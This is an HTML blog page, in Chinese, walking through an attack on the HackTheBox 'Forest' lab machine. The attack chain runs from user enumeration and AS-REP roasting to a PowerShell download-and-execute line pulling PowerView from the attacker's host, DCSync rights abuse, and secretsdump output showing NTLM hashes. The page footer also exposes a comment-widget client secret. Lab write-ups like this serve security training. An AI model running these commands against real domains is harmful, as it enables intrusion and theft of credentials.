@@ -1,0 +1,319 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Active Directory 101-Forest | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Active Directory 101-Forest | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Forest
+前言
+学了一段时间的域渗透了，最近开了一个HTB的会员（老贵了)。想的是玩一下他那个Active Directory 101系列的靶机。这是第一台靶机 Forest后面有时间的话再玩一下那个cloud系列的云靶机。
+信息收集
+..." />
+    <meta name="keywords" content="AD域,AS-REP Roasting,DCsync,HackTheBox" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Active Directory 101-Forest
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-04
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/ggcS95uZq/" class="post-tag">
+                  # AD域
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/iTHfpIy68/" class="post-tag">
+                  # AS-REP Roasting
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/MW2luqKqC/" class="post-tag">
+                  # DCsync
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/4AeNKZQf4/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="forest">Forest</h1>
+<h2 id="前言">前言</h2>
+<p>学了一段时间的域渗透了，最近开了一个HTB的会员（老贵了)。想的是玩一下他那个Active Directory 101系列的靶机。这是第一台靶机 Forest后面有时间的话再玩一下那个cloud系列的云靶机。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>还是正常的扫描端口</p>
+<pre><code>nmap -sC -sV -p- 10.10.10.161 
+</code></pre>
+<p>扫描得到端口信息</p>
+<p>通过扫描得到端口开放信息中有<strong>Kerberos</strong>   <strong>LDAP</strong>   <strong>SMB</strong>  <strong>WInrm</strong>   <strong>RPC</strong>  主要这些敏感服务端口</p>
+<h4 id="kerberos用户枚举">Kerberos用户枚举</h4>
+<pre><code>kerbrute_linux_amd64 userenum --dc 10.10.10.161 -d htb.local 字典地址
+</code></pre>
+<p>枚举到了 admin 用户</p>
+<h4 id="rpc用户枚举">RPC用户枚举</h4>
+<pre><code>rpcclient -U &quot;&quot; 10.10.10.161       建立连接 
+enumdomusers                       枚举用户
+</code></pre>
+<h4 id="ldap用户枚举">Ldap用户枚举</h4>
+<pre><code>ldapsearch -x -b &quot;DC=htb,DC=local&quot;  -s base -h 10.10.10.161
+</code></pre>
+<pre><code>经过对枚举结果的筛选后发现如下用户名
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+</code></pre>
+<p>在通过kerbrute 枚举得到用户确实存在</p>
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+<p>因为在设置svc-alfresco用户后，该用户不可以开预认证，因此我们可以直接拿到其TGT</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204114043256.png" alt="image-20231204114043256" loading="lazy"></figure>
+<p>将这段hash保存保存到本地文件中使用john暴破出来。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204114423092.png" alt="image-20231204114423092" loading="lazy"></figure>
+<h2 id="winrm">WINRM</h2>
+<p>由于开放了WINRM服务端口可以通过 evil winrm进行登录。</p>
+<pre><code>evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204115118559.png" alt="image-20231204115118559" loading="lazy"></figure>
+<h2 id="blood信息收集">Blood信息收集</h2>
+<p>登录进去后 可 通过上传blood确定攻击的路径。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204115333208.png" alt="image-20231204115333208" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204115646092.png" alt="image-20231204115646092" loading="lazy"></figure>
+<h2 id="滥用writedacl-权限进行dcsync攻击实现权限提升">滥用writeDACL 权限进行DCsync攻击实现权限提升</h2>
+<p>通过搜索“svc-alfresco”用户，我发现实际上该用户属于 Account Operators 组，该组是AD中的特权组之一，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。但是，不能更改属于Administrators或Domain Admins组的账号，也不能更改这些组。</p>
+<p>svc-alfresco 到 Domain Admins 的路径，发现exchange windows permission组完全信任Account Operators 组，因此我们可以利用Account Operators 组的权限创建一个新用户，然后把他添加到exchange windows permission组，这样我们就可以对HTB.LOCAL进行一些操作了，我们看到exchange windows permission组的成员对htb.local用有writeDACL权限， 然后我们可以利用我们新添加的用户对HTB.LOCAL的 writeDACL权限进行恶意利用，进而实现权限提升.</p>
+<p>后面的操作主要集中位创建一个用户然后利用缺陷 将他添加到不同的组中</p>
+<pre><code>net user test123  test123! /add /domain 
+net group      #该命令的结果中找到了Exchange Windows Permissions组
+net group 'Exchange Windows Permissions' test123  /add /domain 
+net localgroup   #在该命令的结果中发现了Remote Management Users组 
+net localgroup 'Remote Management Users' test123  /add
+</code></pre>
+<p>然后登录到使用创建的用户登录。</p>
+<pre><code>python -m http.server 80
+</code></pre>
+<pre><code>evil-winrm -u test123 -p test123！ -i 10.10.10.161
+</code></pre>
+<pre><code>powershell -nop -exec bypass -c &quot;iex(New-Object  Net.webclient).downloadstring('http://10.10.16.12/PowerView.ps1')&quot;
+</code></pre>
+<pre><code>Add-DomainObjectAcl -PrincipalIdentity 'test123' -TargetIdentity 'DC=htb,DC=local' -Rights DCSync
+</code></pre>
+<p>此时，我们就可以使用升级后的权限，我们可以使用secretsdump.py工具执行 DCSync 以转储“管理员”用户的 NTLM 哈希</p>
+<pre><code>secretsdump.py test123:'test123!'@10.10.10.161
+
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+...
+...
+...
+[*] Cleaning up...
+</code></pre>
+<p>得到管理员的hash值就可以使用wmiexec直接登录到用户上去。</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204120841570.png" alt="image-20231204120841570" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>通过对于开放服务的枚举得到了 svc-alfresco 用户。通过john破译出了密码。使用账号密码进行了登录  使用blood进行了一波信息收集。经过分析后发现当前用户所处组为Account Operators 组，该组被Exchange Windows Permissions组完全信任，所以我们新建了用户并将其添加到了该用户组，又因为，Exchange Windows Permissions组对HTB.LOCAL有WriteDACL权限，我们对其使用了DCsync攻击，成功获取到了管理员的hash，最终通过wmiexec哈希传递拿到了管理员权限。</p>
+<h2 id="参考链接">参考链接</h2>
+<p>https://www.freebuf.com/author/%E5%8D%97%E5%9F%8E%E5%A4%95%E9%9B%BEhacker</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#forest">Forest</a>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a><br>
+*
+<ul>
+<li><a href="#kerberos%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE">Kerberos用户枚举</a></li>
+<li><a href="#rpc%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE">RPC用户枚举</a></li>
+<li><a href="#ldap%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE">Ldap用户枚举</a></li>
+</ul>
+</li>
+<li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+<li><a href="#winrm">WINRM</a></li>
+<li><a href="#blood%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">Blood信息收集</a></li>
+<li><a href="#%E6%BB%A5%E7%94%A8writedacl-%E6%9D%83%E9%99%90%E8%BF%9B%E8%A1%8Cdcsync%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">滥用writeDACL 权限进行DCsync攻击实现权限提升</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/kerberos-xie-yi-fen-xi/">
+              <h3 class="post-title">
+                Kerberos协议分析
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
